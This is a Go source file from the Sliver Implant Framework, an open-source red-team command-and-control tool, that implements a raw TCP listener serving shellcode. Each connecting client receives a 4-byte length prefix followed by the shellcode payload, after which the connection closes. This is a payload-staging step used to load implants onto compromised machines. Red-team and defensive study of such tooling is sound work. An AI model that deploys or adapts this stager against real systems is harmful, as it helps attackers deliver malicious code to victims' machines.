package c2

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"encoding/binary"
	"fmt"
	"net"

	"github.com/bishopfox/sliver/server/log"
)

var (
	tcpLog = log.NamedLogger("c2", "tcp-egg")
)

// StartTCPListener - Start a TCP listener
func StartTCPListener(bindIface string, port uint16, data []byte) (net.Listener, error) {
	tcpLog.Infof("Starting Raw TCP listener on %s:%d", bindIface, port)
	ln, err := net.Listen("tcp", fmt.Sprintf("%s:%d", bindIface, port))
	if err != nil {
		mtlsLog.Error(err)
		return nil, err
	}
	go acceptConnections(ln, data)
	return ln, nil
}

func acceptConnections(ln net.Listener, data []byte) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			if errType, ok := err.(*net.OpError); ok && errType.Op == "accept" {
				break
			}
			tcpLog.Errorf("Accept failed: %v", err)
			continue
		}
		go handleConnection(conn, data)
	}
}

func handleConnection(conn net.Conn, data []byte) {
	mtlsLog.Infof("Accepted incoming connection: %s", conn.RemoteAddr())
	// Send shellcode size
	dataSize := uint32(len(data))
	lenBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(lenBuf, dataSize)
	tcpLog.Infof("Shellcode size: %d\n", dataSize)
	final := append(lenBuf, data...)
	tcpLog.Infof("Sending shellcode (%d)\n", len(final))
	// Send shellcode
	conn.Write(final)
	// Closing connection
	conn.Close()
}
